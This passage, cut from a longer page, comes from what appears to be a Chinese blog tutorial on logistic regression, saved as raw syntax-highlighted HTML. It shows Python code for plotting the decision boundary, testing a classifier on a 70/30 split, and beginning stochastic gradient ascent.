class=\"crayon-cn\">30</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'red'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">marker</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'s'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ax</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">scatter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">xcord2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ycord2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">s</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'green'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">arange</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">3.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">transpose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ax</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">plot</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">plt</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">xlabel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'X1'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">plt</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">ylabel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'X2'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">plt</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">show</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-23\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">__name__</span><span class=\"crayon-o\">==</span><span class=\"crayon-s\">'__main__'</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">loadDataSet</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weights</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">gradAscent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">print</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'回归系数：\\n'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">weights</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-27\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">plotBestFit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0063 seconds] -->\r\n<p>运行后，我们得到如下图片：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fm60lu2rxoj20hs0dcdg0.jpg\" width=\"640\" height=\"480\"></p>\n<p>通过我们的观察，我们的这个回归系数的算法还是比较准确的，拟合曲线将样本数据分成两部分，并且符合样本的分类规则。</p>\n<p>接下来，我们来实现一个分类器，并测试这个分类器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a0cef767610157282\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef classify0(targetData,weights):\r\n    v = sigmoid(targetData*weights)\r\n    if v&gt;0.5:\r\n        return 1.0\r\n    else :\r\n        return 0\r\ndef testClassify0():\r\n    dataMat,labelMat=loadDataSet()\r\n    examPercent=0.7\r\n    row,col=shape(dataMat)\r\n    exam=[]\r\n    exam_label=[]\r\n    test=[]\r\n    test_label=[]\r\n    for i in range(row):\r\n        if i &lt; row*examPercent:\r\n            exam.append(dataMat[i])\r\n            exam_label.append(labelMat[i])\r\n        else:\r\n            test.append(dataMat[i])\r\n            test_label.append(labelMat[i])\r\n    weights=gradAscent(exam,exam_label)\r\n    errCnt=0\r\n    trow,tcol=shape(test)\r\n    for i in range(trow):\r\n        v=int(classify0(test[i],weights))\r\n        if v != int(test_label[i]):\r\n            errCnt += 1\r\n            print '计算值：',v,' 原值',test_label[i]\r\n    print '错误率：',errCnt/trow\r\nif __name__=='__main__':\r\n    #dataMat,labelMat=loadDataSet()\r\n    #weights=gradAscent(dataMat,labelMat)\r\n    ##print 'dataMat:\\n',dataMat\r\n    ##print 'labelMat:\\n',labelMat\r\n    #print '回归系数：\\n',weights\r\n    #plotBestFit(weights)\r\n    testClassify0()</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef767610157282-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef767610157282-38\">38</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">classify0</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">targetData</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sigmoid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">targetData*</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">0.5</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.0</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-7\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">testClassify0</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">loadDataSet</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">examPercent</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">row</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">col</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">shape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">exam</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">exam_label</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">test</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">test_label</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">row</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">row*</span><span class=\"crayon-v\">examPercent</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">exam</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">exam_label</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-21\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">test_label</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weights</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">gradAscent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">exam</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">exam_label</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">errCnt</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">trow</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">tcol</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">shape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">trow</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">v</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">classify0</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">test_label</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-28\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">errCnt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-29\"><span class=\"crayon-h\">            </span><span class=\"crayon-i\">print</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'计算值：'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">' 原值'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">test_label</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">print</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'错误率：'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">errCnt</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">trow</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-31\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">__name__</span><span class=\"crayon-o\">==</span><span class=\"crayon-s\">'__main__'</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#dataMat,labelMat=loadDataSet()</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#weights=gradAscent(dataMat,labelMat)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">##print 'dataMat:\\n',dataMat</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">##print 'labelMat:\\n',labelMat</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-36\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print '回归系数：\\n',weights</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef767610157282-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#plotBestFit(weights)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef767610157282-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">testClassify0</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0052 seconds] -->\r\n<p>分类器的实现很简单。我们使用之前的样本数据中的70条数据作为我们测试的样本数据，计算出回归系数。然后用分类器对剩下的30条记录进行分类，然后将结果和样本数据进行对比。最后打印出错误率。我们可以看到，错误率是0，近乎完美！我们可以修改测试样本在原样本空间的比例多测试几遍。那么，结论是我们的算法的准确率还不错！</p>\n<p>那么，到这里问题就解决了吗？好像还差一点什么。我们来仔细研究一下我们计算回归系数的方法，不难发现，这个过程中我们用样本数据组成的矩阵进行了矩阵乘法。也就是说，为了计算回归系数，我们遍历了整个样本数据。</p>\n<p>我们的问题又来了，我们例子中的样本数据只有100条，如果处理成千上万的样本数据，我们的计算回归系数的函数的计算复杂度会直线上升。下面我们来看看如何优化这个算法。</p>\n<h2 id=\"title-4\">四、优化梯度上升算法——随机梯度上升法</h2>\n<p>我们在理解了回归系数迭代计算的公式</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fm60lxkhvdj20ba02f746.jpg\" width=\"406\" height=\"87\"><br>\n和我们实现的程序之后。我们将计算回归系数的方法进行如下改进：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a0cef76c082557243\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef stocGradAscent0(dataMatrix, classLabels):\r\n    m,n = shape(dataMatrix)\r\n    alpha = 0.01\r\n    weights = ones((n,1))   #initialize to all ones\r\n    for i in range(m):\r\n        h = sigmoid(sum(dataMatrix[i]*weights))\r\n        error = classLabels[i] - h\r\n        weights = weights + alpha * error * mat(dataMatrix[i]).transpose()\r\n    return weights</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef76c082557243-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef76c082557243-2\">2</div><div 